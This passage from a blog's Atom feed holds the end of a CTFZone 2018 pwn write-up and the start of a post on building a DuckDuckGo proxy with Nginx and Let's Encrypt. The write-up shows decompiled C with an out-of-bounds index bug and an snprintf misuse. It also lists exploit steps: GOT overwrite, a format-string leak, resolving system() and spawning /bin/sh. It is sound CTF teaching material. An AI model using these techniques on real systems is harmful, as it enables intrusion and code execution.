+&lt;p&gt;这是选项2的实现，通过&lt;code class=&quot;highlighter-rouge&quot;&gt;readint&lt;/code&gt;读入&lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt;型数据，若小于15便赋值给全局变量&lt;code class=&quot;highlighter-rouge&quot;&gt;account_id&lt;/code&gt;. 漏洞在于这里是&lt;strong&gt;可以输入负值&lt;/strong&gt;的，而这个&lt;code class=&quot;highlighter-rouge&quot;&gt;account_id&lt;/code&gt;在多个选项中被当作数组下标来使用，所以会有下越界的问题。&lt;/p&gt;
+
+&lt;p&gt;这个漏洞可以实现什么？有四点：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;受限的任意地址读&lt;/strong&gt;（选项5）；&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;受限的任意地址写&lt;/strong&gt;（选项4）；&lt;/li&gt;
+  &lt;li&gt;受限的任意地址读指针内容（选项5）；&lt;/li&gt;
+  &lt;li&gt;受限的任意地址赋值为堆上的指针（选项3）。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;3、4两点这里用处不大，所以不讲。这里讲下1、2两点。虽然通过负值的&lt;code class=&quot;highlighter-rouge&quot;&gt;account_id&lt;/code&gt;实现了一定程度的任意地址读写，但是毕竟还是受限的。&lt;/p&gt;
+
+&lt;p&gt;以下是选项5的实现：&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;account_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3@2&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0@4&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+Ch] [bp-158h]@4&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+15Ch] [bp-8h]@1&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_stack_chk_guard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notes_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notes_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unk_1196C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x150u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;id: %u, value: %d$, note:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notes_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_stack_chk_guard&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;_stack_chk_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;notes_arr&lt;/code&gt;是bss段上的数组，基址是0x22088，而输入的&lt;code class=&quot;highlighter-rouge&quot;&gt;account_id&lt;/code&gt;必须要小于等于15，所以这里对需要读写的地址addr有3点限制：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;addr到0x22088的offset必须是&lt;strong&gt;8的倍数&lt;/strong&gt;；&lt;/li&gt;
+  &lt;li&gt;addr+4的位置&lt;strong&gt;必须为0&lt;/strong&gt;或是一个&lt;strong&gt;合理的指针&lt;/strong&gt;；&lt;/li&gt;
+  &lt;li&gt;除非addr&lt;strong&gt;小于&lt;code class=&quot;highlighter-rouge&quot;&gt;notes_arr&lt;/code&gt;的地址&lt;/strong&gt;（比如GOT、.text、.data段），不然addr的值不能太小，&lt;code class=&quot;highlighter-rouge&quot;&gt;addr - notes_arr&lt;/code&gt;的值在&lt;strong&gt;无符号int32上必须表现为负数&lt;/strong&gt;。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;2-debug_info越界写&quot;&gt;2. debug_info越界写&lt;/h4&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;debug_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ST14_4@4&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3@5&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0@6&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+Ch] [bp-218h]@1&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+Ch] [bp-218h]@3&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+10h] [bp-214h]@1&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-20Ch]@3&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ch] [bp-208h]@1&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+21Ch] [bp-8h]@1&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_stack_chk_guard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x200u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%d$&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notes_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;debug_info&lt;/code&gt;直接拿&lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;返回值做数组下标，移动v3指针。这是对&lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;返回值的一个典型误用。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RETURN VALUE&lt;/p&gt;
+
+  &lt;p&gt;The functions snprintf() and vsnprintf() do not write  more  than  size bytes  (including the terminating null byte (‘\0’)).  If the output was truncated due to this limit, then the return value  is  the  number  of characters  (excluding the terminating null byte) which &lt;strong&gt;would have been&lt;/strong&gt; written to the final string if enough space had been available. Thus, a  return  value  of  size or more means that the output was truncated. (See also below under NOTES.)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;看man文档其实就可以发现，snprintf返回的不是实际往目标buf里写了多少字节，而是&lt;strong&gt;本应写多少字节&lt;/strong&gt;。这个漏洞利用后其实可以&lt;strong&gt;越过stack cookie&lt;/strong&gt;写值，&lt;strong&gt;绕过canary保护&lt;/strong&gt;，实现&lt;strong&gt;ROP&lt;/strong&gt;攻击。但是&lt;strong&gt;buf中不能出现null byte&lt;/strong&gt;，而且我对ARM下的ROP不熟，所以这个思路在赛间只是个备选项。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt; 这个debug选项可以通过上文的「受限的任意地址赋值为堆上的指针」来打开，这里不再赘述。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;P.S.S.&lt;/strong&gt; 其实我用qemu调这个二进制的时候，发现stack是rwx（可写可执行）的&lt;del&gt;（这个比赛真的有毒。。。）&lt;/del&gt;。但是如果想要leak栈地址，其实还是需要一个任意地址读。可是回过头来，如果有了任意地址读，还需要做ROP这么复杂的利用吗？&lt;/p&gt;
+
+&lt;h3 id=&quot;exp-1&quot;&gt;EXP&lt;/h3&gt;
+
+&lt;p&gt;我的利用思路个人感觉比较清奇，需要绕个小弯，是在洗澡的时候想出来的&lt;del&gt;（又一次）&lt;/del&gt;。&lt;/p&gt;
+
+&lt;p&gt;这个利用只用到了&lt;code class=&quot;highlighter-rouge&quot;&gt;account_id&lt;/code&gt;越界这个漏洞，具体步骤是：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;通过受限的任意地址读，读&lt;code class=&quot;highlighter-rouge&quot;&gt;memcmp_got&lt;/code&gt;的值（不管是不是已经被&lt;code class=&quot;highlighter-rouge&quot;&gt;dl-resolve&lt;/code&gt;了，只是需要这个值来计算差值）；&lt;/li&gt;
+  &lt;li&gt;通过受限的任意地址写，把&lt;code class=&quot;highlighter-rouge&quot;&gt;printf_plt&lt;/code&gt;的值写到&lt;code class=&quot;highlighter-rouge&quot;&gt;memcmp_got&lt;/code&gt;上去（这一步需要计算&lt;code class=&quot;highlighter-rouge&quot;&gt;memcmp_got&lt;/code&gt;到&lt;code class=&quot;highlighter-rouge&quot;&gt;printf_plt&lt;/code&gt;的差值），&lt;strong&gt;此时memcmp已经变成了printf&lt;/strong&gt;；&lt;/li&gt;
+  &lt;li&gt;选项6的&lt;code class=&quot;highlighter-rouge&quot;&gt;enable_debug&lt;/code&gt;函数用到了memcmp，而且第一个参数就是用户输入的字符串，所以这里&lt;del&gt;强行&lt;/del&gt;构造了一个FSB漏洞，可以精心构造Format String来实现任意地址读：&lt;/li&gt;
+  &lt;li&gt;利用pwntools的DynELF工具，结合在&lt;code class=&quot;highlighter-rouge&quot;&gt;enable_debug&lt;/code&gt;构造的任意地址读（即leak），泄密libc上的&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数地址；&lt;/li&gt;
+  &lt;li&gt;通过受限的任意地址写，将&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数地址写到&lt;code class=&quot;highlighter-rouge&quot;&gt;memcmp_got&lt;/code&gt;上，调用&lt;code class=&quot;highlighter-rouge&quot;&gt;enable_debug&lt;/code&gt;，传入&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;，getshell.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;exp.py:&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot; data-gist-file=&quot;bank-exp.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot;&gt;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2018/07/writeup-ctfzone/&quot;&gt;Writeup: CTFZone 2018 Quals&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on July 23, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[如何用 Nginx 搭建简单的 DuckDuckGo 代理站]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/" />
+  <id>https://cubl.in/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx</id>
+  <published>2016-04-09T00:00:00+00:00</published>
+  <updated>2016-04-09T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;最近感觉手机的网络环境经常变，在寝室 v6， 出门 v4，有的时候会懒得开代理。所以就用 cloudflare+nginx 搞了个简单的 &lt;a href=&quot;https://duckduckgo.com&quot;&gt;DuckDuckGo&lt;/a&gt; 代理站，方便随时掏出手机搜索。没有选择代理 Google 有几点原因，一个是 vps 连 Google 经常让输验证码，再就是 DuckDuckGo 不带 cookie 的搜索结果貌似比 Google 优(?)。&lt;/p&gt;
+
+&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;
+
+&lt;p&gt;nginx 的配置文件如下。&lt;code class=&quot;highlighter-rouge&quot;&gt;domain.com&lt;/code&gt; 改成具体的域名，&lt;code class=&quot;highlighter-rouge&quot;&gt;/path/to/&lt;/code&gt;要改成 duck.domain.com 的证书路径。&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/letsencrypt/live/images.duck.domain.com/&lt;/code&gt;是 Let’s encrypt 生成证书的默认目录，稍后会提到。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/08e99fbf316a435b7935727810e40458&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/08e99fbf316a435b7935727810e40458&quot;&gt;cubarco/08e99fbf316a435b7935727810e40458&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cloudflare&quot;&gt;Cloudflare&lt;/h3&gt;
+
+&lt;p&gt;duck.domain.com 可以用 Cloudflare 做 CDN，然后 crypto 策略选 Full(非strict) 的话在服务器上可以随便给 duck.domain.com 创建个证书用，具体参照&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;。但是像 images.duck.domain.com 这种三级域名的话，Cloudflare 是没有给 SSL 证书的，所以只好自己在服务器上配，推荐用 Let’s encrypt 签证书，方便快捷。&lt;/p&gt;
+
+&lt;h3 id=&quot;lets-encrypt&quot;&gt;Let’s encrypt&lt;/h3&gt;
+
+&lt;p&gt;Let’s encrypt 的使用细节我就不赘述了，可以看官方给的 Guide&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;这里需要的三个证书可以用如下命令生成：&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;./letsencrypt-auto certonly --manual -d images.duck.domain.com \
+    -d icons.duck.domain.com \
+    -d ac.duck.domain.com
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://gist.github.com/jessedearing/2351836&quot;&gt;Create self-signed SSL certificate for Nginx&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://letsencrypt.org/getting-started/&quot;&gt;Getting Started @ Let’s Encrypt&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
